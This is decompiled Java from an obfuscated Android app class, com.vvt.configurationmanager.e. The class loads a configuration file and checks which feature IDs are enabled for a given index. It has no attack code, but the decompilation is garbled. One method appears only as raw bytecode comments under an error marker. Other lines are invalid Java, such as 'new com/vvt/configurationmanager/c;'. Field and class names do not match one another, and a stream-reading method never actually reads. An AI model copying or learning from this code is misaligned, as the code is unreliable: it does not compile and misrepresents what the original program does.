package com.vvt.configurationmanager;

import com.vvt.ak.a;
import com.vvt.base.FeatureId;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.util.Iterator;
import java.util.List;

public class e
  implements d
{
  private static boolean a = a.b;
  private static boolean b = a.e;
  private List c;
  private f d;
  
  public e(f paramf)
  {
    this.d = paramf;
  }
  
  public c a(int paramInt)
  {
    List localList = this.c;
    return a(localList, paramInt);
  }
  
  c a(List paramList, int paramInt)
  {
    boolean bool;
    c localc;
    if (paramList != null)
    {
      Iterator localIterator = paramList.iterator();
      int i;
      do
      {
        bool = localIterator.hasNext();
        if (!bool) {
          break;
        }
        localc = (c)localIterator.next();
        i = localc.a();
      } while (i != paramInt);
    }
    for (;;)
    {
      if (localc == null)
      {
        localc = new com/vvt/configurationmanager/c;
        localc.<init>();
      }
      return localc;
      bool = false;
      localc = null;
    }
  }
  
  /* Error */
  public void a(String paramString)
  {
    // Byte code:
    //   0: getstatic 19	com/vvt/configurationmanager/e:a	Z
    //   3: istore_2
    //   4: iload_2
    //   5: ifeq +3 -> 8
    //   8: aload_0
    //   9: getfield 29	com/vvt/configurationmanager/e:d	Lcom/vvt/configurationmanager/f;
    //   12: astore_3
    //   13: aload_3
    //   14: aload_1
    //   15: invokeinterface 61 2 0
    //   20: iconst_0
    //   21: istore 4
    //   23: aconst_null
    //   24: astore 5
    //   26: new 63	java/io/FileInputStream
    //   29: astore_3
    //   30: new 65	java/io/File
    //   33: astore 6
    //   35: aload 6
    //   37: aload_1
    //   38: invokespecial 67	java/io/File:<init>	(Ljava/lang/String;)V
    //   41: aload_3
    //   42: aload 6
    //   44: invokespecial 70	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   47: aload_0
    //   48: aload_3
    //   49: invokevirtual 73	com/vvt/configurationmanager/e:a	(Ljava/io/InputStream;)[B
    //   52: astore 5
    //   54: aload 5
    //   56: ifnull +48 -> 104
    //   59: aload 5
    //   61: arraylength
    //   62: istore 7
    //   64: iload 7
    //   66: ifle +38 -> 104
    //   69: aload 5
    //   71: invokestatic 78	com/vvt/configurationmanager/a:a	([B)Ljava/lang/String;
    //   74: astore 5
    //   76: aload 5
    //   78: ifnull +26 -> 104
    //   81: aload 5
    //   83: invokestatic 83	com/vvt/configurationmanager/removeFromPath:a	(Ljava/lang/String;)Ljava/util/List;
    //   86: astore 5
    //   88: aload_0
    //   89: aload 5
    //   91: putfield 31	com/vvt/configurationmanager/e:MyUncaughtExceptionHandler	Ljava/util/List;
    //   94: getstatic 19	com/vvt/configurationmanager/e:a	Z
    //   97: istore 4
    //   99: iload 4
    //   101: ifeq +3 -> 104
    //   104: aload_3
    //   105: invokestatic 88	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   108: return
    //   109: astore_3
    //   110: iconst_0
    //   111: istore_2
    //   112: aconst_null
    //   113: astore_3
    //   114: getstatic 23	com/vvt/configurationmanager/e:removeFromPath	Z
    //   117: istore 4
    //   119: iload 4
    //   121: ifeq +3 -> 124
    //   124: new 90	com/vvt/configurationmanager/PcfLoadingException
    //   127: astore 5
    //   129: aload 5
    //   131: invokespecial 91	com/vvt/configurationmanager/PcfLoadingException:<init>	()V
    //   134: aload 5
    //   136: athrow
    //   137: astore 8
    //   139: aload_3
    //   140: astore 5
    //   142: aload 8
    //   144: astore_3
    //   145: aload 5
    //   147: invokestatic 88	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   150: aload_3
    //   151: athrow
    //   152: astore_3
    //   153: goto -8 -> 145
    //   156: astore 5
    //   158: goto -44 -> 114
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	161	0	this	e
    //   0	161	1	paramString	String
    //   3	109	2	bool1	boolean
    //   12	93	3	localObject1	Object
    //   109	1	3	localException1	Exception
    //   113	38	3	localObject2	Object
    //   152	1	3	localObject3	Object
    //   21	99	4	bool2	boolean
    //   24	122	5	localObject4	Object
    //   156	1	5	localException2	Exception
    //   33	10	6	localFile	java.io.File
    //   62	3	7	i	int
    //   137	6	8	localObject5	Object
    // Exception table:
    //   from	to	target	type
    //   26	29	109	java/lang/Exception
    //   30	33	109	java/lang/Exception
    //   37	41	109	java/lang/Exception
    //   42	47	109	java/lang/Exception
    //   48	52	137	finally
    //   59	62	137	finally
    //   69	74	137	finally
    //   81	86	137	finally
    //   89	94	137	finally
    //   94	97	137	finally
    //   114	117	137	finally
    //   124	127	137	finally
    //   129	134	137	finally
    //   134	137	137	finally
    //   26	29	152	finally
    //   30	33	152	finally
    //   37	41	152	finally
    //   42	47	152	finally
    //   48	52	156	java/lang/Exception
    //   59	62	156	java/lang/Exception
    //   69	74	156	java/lang/Exception
    //   81	86	156	java/lang/Exception
    //   89	94	156	java/lang/Exception
    //   94	97	156	java/lang/Exception
  }
  
  public boolean a(FeatureId paramFeatureId, int paramInt)
  {
    return a(paramInt).b().contains(paramFeatureId);
  }
  
  byte[] a(InputStream paramInputStream)
  {
    boolean bool1 = false;
    localObject1 = null;
    try
    {
      int i = paramInputStream.available();
      localObject2 = new byte[i];
      Object localObject3;
      boolean bool2;
      return (byte[])localObject2;
    }
    catch (FileNotFoundException localFileNotFoundException1)
    {
      for (;;)
      {
        localFileNotFoundException1 = localFileNotFoundException1;
        bool2 = false;
        localObject2 = null;
        bool1 = b;
        if (bool1) {}
        com.vvt.io.d.a(paramInputStream);
      }
    }
    catch (IOException localIOException1)
    {
      for (;;)
      {
        bool2 = b;
        if (bool2) {}
        com.vvt.io.d.a(paramInputStream);
        localObject2 = localObject1;
      }
    }
    finally
    {
      com.vvt.io.d.a(paramInputStream);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/configurationmanager/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */